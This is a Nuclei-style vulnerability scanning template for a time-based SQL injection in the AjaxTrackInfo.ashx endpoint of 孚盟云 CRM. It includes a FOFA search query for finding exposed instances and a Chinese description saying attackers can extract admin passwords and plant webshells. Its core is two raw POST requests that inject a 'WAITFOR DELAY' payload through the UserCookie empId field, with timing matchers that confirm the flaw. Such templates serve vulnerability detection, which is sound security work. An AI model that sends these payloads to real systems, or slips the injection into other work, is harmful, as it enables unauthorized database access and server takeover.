id: fumengyun-crm-ajaxtrackinfo-ashx-sql-injection

info:
  name: "孚盟云CRM AjaxTrackInfo.ashx接口SQL注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="孚盟软件-孚盟云"
    上海孚盟软件有限公司提供外贸SaaS服务及行业解决方案。经检测，其孚盟云产品中的AjaxTrackInfo.ashx接口存在SQL注入漏洞。该漏洞允许未授权远程攻击者通过构造恶意请求获取数据库敏感信息（如管理员密码、用户隐私数据）。在特定高权限条件下，攻击者还可利用此漏洞向服务器写入Webshell，进而完全控制服务器系统权限。
  tags: 孚盟云CRM

http:
- raw:
  - |
    POST /m/Dingding/Ajax/AjaxTrackInfo.ashx HTTP/1.1
    Host: {{Hostname}}
    Cookie: UserCookie={"empId":"'WAITFOR DELAY'0:0:5'--","corpId": "1"}
    Content-Type: application/x-www-form-urlencoded

    method=SendMessage
  - |
    POST /m/Dingding/Ajax/AjaxTrackInfo.ashx HTTP/1.1
    Host: {{Hostname}}
    Cookie: UserCookie={"empId":"'WAITFOR DELAY'0:0:8'--","corpId": "1"}
    Content-Type: application/x-www-form-urlencoded

    method=SendMessage
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=5 && duration_1<=6'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
